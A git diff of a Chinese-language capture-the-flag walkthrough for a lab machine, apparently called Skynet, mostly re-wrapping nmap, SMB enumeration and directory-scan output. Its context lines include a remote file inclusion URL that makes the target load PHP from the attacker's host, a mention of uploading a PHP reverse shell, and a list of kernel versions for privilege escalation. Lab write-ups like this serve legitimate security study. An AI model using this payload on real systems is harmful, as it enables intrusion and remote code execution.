@@ -19,7 +19,13 @@ linux
 ### [](#0X01循例信息收集 "0X01循例信息收集")0X01循例信息收集
 
 ```shell
-Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-14 09:20 UTCNmap scan report for ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)Host is up (0.0054s latency).Not shown: 994 closed tcp ports (reset)PORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http110/tcp open  pop3139/tcp open  netbios-ssn143/tcp open  imap445/tcp open  microsoft-dsMAC Address: 02:58:B4:7D:6E:6D (Unknown)# 详细扫描PORT    STATE SERVICE     VERSION22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 992331bbb1e943b756944cb9e82146c5 (RSA)|   256 57c07502712d193183dbe4fe679668cf (ECDSA)|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Skynet110/tcp open  pop3        Dovecot pop3d|_pop3-capabilities: TOP CAPA SASL RESP-CODES UIDL AUTH-RESP-CODE PIPELINING139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open  imap        Dovecot imapd|_imap-capabilities: IDLE ID SASL-IR post-login ENABLE Pre-login more capabilities have LITERAL+ OK LOGIN-REFERRALS listed LOGINDISABLEDA0001 IMAP4rev1445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)MAC Address: 02:58:B4:7D:6E:6D (Unknown)Aggressive OS guesses: Linux 3.10 - 3.13 (99%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.8 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopService Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s| smb2-security-mode: |   311: |_    Message signing enabled but not required|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)| smb2-time: |   date: 2024-06-14T09:22:35|_  start_date: N/A| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: skynet|   NetBIOS computer name: SKYNET\x00|   Domain name: \x00|   FQDN: skynet|_  System time: 2024-06-14T04:22:35-05:00TRACEROUTEHOP RTT     ADDRESS1   0.54 ms ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)
+Starting Nmap 7.93 ( https://nmap.org )
+at 2024-06-14 09:20 UTCNmap scan report for ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)Host is up (0.0054s latency).Not shown: 994 closed tcp ports (reset)PORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http110/tcp open  pop3139/tcp open  netbios-ssn143/tcp open  imap445/tcp open  microsoft-dsMAC Address: 02:58:B4:7D:6E:6D (Unknown)# 详细扫描PORT    STATE SERVICE     VERSION22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux;
+protocol 2.0)| ssh-hostkey: |   2048 992331bbb1e943b756944cb9e82146c5 (RSA)|   256 57c07502712d193183dbe4fe679668cf (ECDSA)|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Skynet110/tcp open  pop3        Dovecot pop3d|_pop3-capabilities: TOP CAPA SASL RESP-CODES UIDL AUTH-RESP-CODE PIPELINING139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open  imap        Dovecot imapd|_imap-capabilities: IDLE ID SASL-IR post-login ENABLE Pre-login more capabilities have LITERAL+ OK LOGIN-REFERRALS listed LOGINDISABLEDA0001 IMAP4rev1445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)MAC Address: 02:58:B4:7D:6E:6D (Unknown)Aggressive OS guesses: Linux 3.10 - 3.13 (99%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4)
+(95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.8 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17)
+(92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopService Info: Host: SKYNET;
+OS: Linux;
+CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s| smb2-security-mode: |   311: |_    Message signing enabled but not required|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)| smb2-time: |   date: 2024-06-14T09:22:35|_  start_date: N/A| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: skynet|   NetBIOS computer name: SKYNET\x00|   Domain name: \x00|   FQDN: skynet|_  System time: 2024-06-14T04:22:35-05:00TRACEROUTEHOP RTT     ADDRESS1   0.54 ms ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)
 ```
 
 #### [](#0X02资产梳理 "0X02资产梳理")0X02资产梳理
@@ -86,6 +92,7 @@ smb 445
 
 ```shell
 Host script results:| smb-enum-shares: |   account_used: guest|   \\10.10.14.193\IPC$: |     Type: STYPE_IPC_HIDDEN|     Comment: IPC Service (skynet server (Samba, Ubuntu))|     Users: 2|     Max Users: <unlimited>|     Path: C:\tmp|     Anonymous access: READ/WRITE|     Current user access: READ/WRITE|   \\10.10.14.193\anonymous: |     Type: STYPE_DISKTREE|     Comment: Skynet Anonymous Share|     Users: 0|     Max Users: <unlimited>|     Path: C:\srv\samba|     Anonymous access: READ/WRITE|     Current user access: READ/WRITE|   \\10.10.14.193\milesdyson: |     Type: STYPE_DISKTREE|     Comment: Miles Dyson Personal Share|     Users: 0|     Max Users: <unlimited>|     Path: C:\home\milesdyson\share|     Anonymous access: <none>|     Current user access: <none>|   \\10.10.14.193\print$: |     Type: STYPE_DISKTREE|     Comment: Printer Drivers|     Users: 0|     Max Users: <unlimited>|     Path: C:\var\lib\samba\printers|     Anonymous access: <none>|_    Current user access: <none>| smb-enum-users: |   SKYNET\milesdyson (RID: 1000)|     Full name:   |     Description: |_    Flags:       Normal user account
+
 ```
 
 > 可得信息
@@ -128,7 +135,9 @@ smbclient //10.10.14.193/anonymous
 ###### [](#目录扫描 "目录扫描")目录扫描
 
 ```shell
----- Scanning URL: http://10.10.104.193/ ----==> DIRECTORY: http://10.10.104.193/admin/                              ==> DIRECTORY: http://10.10.104.193/config/                                                                                                          ==> DIRECTORY: http://10.10.104.193/css/                                             + http://10.10.104.193/index.html (CODE:200|SIZE:523)                                   ==> DIRECTORY: http://10.10.104.193/js/                                                                                                                                + http://10.10.104.193/server-status (CODE:403|SIZE:278)                                                                                                               ==> DIRECTORY: http://10.10.104.193/squirrelmail/  [21:32:40] 403 -  278B  - /.ht_wsr.txt                                      [21:32:40] 403 -  278B  - /.htaccess.orig                                   [21:32:40] 403 -  278B  - /.htaccess.sample[21:32:40] 403 -  278B  - /.htaccess.save[21:32:40] 403 -  278B  - /.htaccess_extra                                  [21:32:40] 403 -  278B  - /.htaccess_orig[21:32:40] 403 -  278B  - /.htaccessBAK[21:32:40] 403 -  278B  - /.htaccessOLD                                     [21:32:40] 403 -  278B  - /.htaccessOLD2[21:32:40] 403 -  278B  - /.html                                            [21:32:40] 403 -  278B  - /.htaccess_sc[21:32:40] 403 -  278B  - /.htm                                             [21:32:40] 403 -  278B  - /.httr-oauth                                      [21:32:40] 403 -  278B  - /.htpasswds[21:32:40] 403 -  278B  - /.htpasswd_test[21:32:41] 403 -  278B  - /.htaccess.bak1                                   [21:32:44] 403 -  278B  - /.php                                             [21:32:44] 403 -  278B  - /.php3                                            [21:33:05] 403 -  278B  - /admin/                                           [21:33:46] 403 -  278B  - /config/                                          [21:34:22] 403 -  278B  - /js/                                              [21:35:02] 403 -  278B  - /server-status                                    [21:35:04] 403 -  278B  - /server-status/ 
+---- Scanning URL: http://10.10.104.193/ ----==> DIRECTORY: http://10.10.104.193/admin/                              ==> DIRECTORY: http://10.10.104.193/config/                                                                                                          ==> DIRECTORY: http://10.10.104.193/css/                                             + http://10.10.104.193/index.html (CODE:200|SIZE:523)
+==> DIRECTORY: http://10.10.104.193/js/                                                                                                                                + http://10.10.104.193/server-status (CODE:403|SIZE:278)
+==> DIRECTORY: http://10.10.104.193/squirrelmail/  [21:32:40] 403 -  278B  - /.ht_wsr.txt                                      [21:32:40] 403 -  278B  - /.htaccess.orig                                   [21:32:40] 403 -  278B  - /.htaccess.sample[21:32:40] 403 -  278B  - /.htaccess.save[21:32:40] 403 -  278B  - /.htaccess_extra                                  [21:32:40] 403 -  278B  - /.htaccess_orig[21:32:40] 403 -  278B  - /.htaccessBAK[21:32:40] 403 -  278B  - /.htaccessOLD                                     [21:32:40] 403 -  278B  - /.htaccessOLD2[21:32:40] 403 -  278B  - /.html                                            [21:32:40] 403 -  278B  - /.htaccess_sc[21:32:40] 403 -  278B  - /.htm                                             [21:32:40] 403 -  278B  - /.httr-oauth                                      [21:32:40] 403 -  278B  - /.htpasswds[21:32:40] 403 -  278B  - /.htpasswd_test[21:32:41] 403 -  278B  - /.htaccess.bak1                                   [21:32:44] 403 -  278B  - /.php                                             [21:32:44] 403 -  278B  - /.php3                                            [21:33:05] 403 -  278B  - /admin/                                           [21:33:46] 403 -  278B  - /config/                                          [21:34:22] 403 -  278B  - /js/                                              [21:35:02] 403 -  278B  - /server-status                                    [21:35:04] 403 -  278B  - /server-status/
 ```
 
 > admin被禁止 访问到一个框架 SquirrelMail version 1.4.23  
@@ -154,7 +163,18 @@ smbclient //10.10.14.193/anonymous
 #### [](#0x22-继续信息收集 "0x22 继续信息收集")0x22 继续信息收集
 
 ```shell
-/images               (Status: 301) [Size: 324] [--> http://10.10.66.17/squirrelmail/images/]/help                 (Status: 403) [Size: 276]/themes               (Status: 301) [Size: 324] [--> http://10.10.66.17/squirrelmail/themes/]/plugins              (Status: 301) [Size: 325] [--> http://10.10.66.17/squirrelmail/plugins/]/src                  (Status: 301) [Size: 321] [--> http://10.10.66.17/squirrelmail/src/]/include              (Status: 403) [Size: 276]/config               (Status: 301) [Size: 324] [--> http://10.10.66.17/squirrelmail/config/]/class                (Status: 403) [Size: 276]/functions            (Status: 403) [Size: 276]/po                   (Status: 403) [Size: 276]/locale               (Status: 403) [Size: 276]
+/images               (Status: 301)
+[Size: 324] [--> http://10.10.66.17/squirrelmail/images/]/help                 (Status: 403)
+[Size: 276]/themes               (Status: 301)
+[Size: 324] [--> http://10.10.66.17/squirrelmail/themes/]/plugins              (Status: 301)
+[Size: 325] [--> http://10.10.66.17/squirrelmail/plugins/]/src                  (Status: 301)
+[Size: 321] [--> http://10.10.66.17/squirrelmail/src/]/include              (Status: 403)
+[Size: 276]/config               (Status: 301)
+[Size: 324] [--> http://10.10.66.17/squirrelmail/config/]/class                (Status: 403)
+[Size: 276]/functions            (Status: 403)
+[Size: 276]/po                   (Status: 403)
+[Size: 276]/locale               (Status: 403)
+[Size: 276]
 ```
 
 > 这次咱们用 用户进去看看权限 403 页面登陆了还是禁止的  
@@ -168,6 +188,7 @@ smbclient //10.10.14.193/anonymous
 
 ```plaintext
 Try "help" to get a list of possible commands.smb: \> dir  .                                   D        0  Tue Sep 17 09:05:47 2019  ..                                  D        0  Wed Sep 18 03:51:03 2019  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 09:05:14 2019  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 09:05:14 2019  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 09:05:14 2019  notes                               D        0  Tue Sep 17 09:18:40 2019  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 09:05:14 2019  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 09:05:14 2019                9204224 blocks of size 1024. 5653536 blocks availablesmb: \> 
+
 ```
 
 全部dump 下来  
@@ -176,6 +197,7 @@ Try "help" to get a list of possible commands.smb: \> dir  .                    
 
 ```text
 1. Add features to beta CMS /45kra24zxs28v3yd2. Work on T-800 Model 101 blueprints3. Spend more time with my wife
+
 ```
 
 陪家人 之后要在CMS /45kra24zxs28v3yd 中开发功能  
@@ -213,6 +235,7 @@ alerts/alertConfigField.php?urlConfig=http://10.11.69.232:8000/1.php
 
 ```shell
 http://10.10.70.173/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.69.232/1.php
+
 ```
 
 不知道为啥他好像不支持 bash 而且 nc也反弹不会来 蚁剑传一个php反向连接shell  
@@ -225,7 +248,9 @@ http://10.10.70.173/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?u
 > 依旧是信息收集 先来信息收集
 
 ```shell
-Linux version 4.8.0-58-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
+Linux version 4.8.0-58-generic (buildd@lgw01-21)
+(gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4)
+) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
 ```
 
 可以看到之前的判断没有错误确实是linux的ubuntu  
@@ -240,6 +265,7 @@ Linux version 4.8.0-58-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ub
 
 ```c
 4.4.0-31-generic4.4.0-62-generic4.4.0-81-generic4.4.0-116-generic4.8.0-58-generic4.10.0.42-generic4.13.0-21-generic
+
 ```
 
 看了wp 之后发现另外一种方式
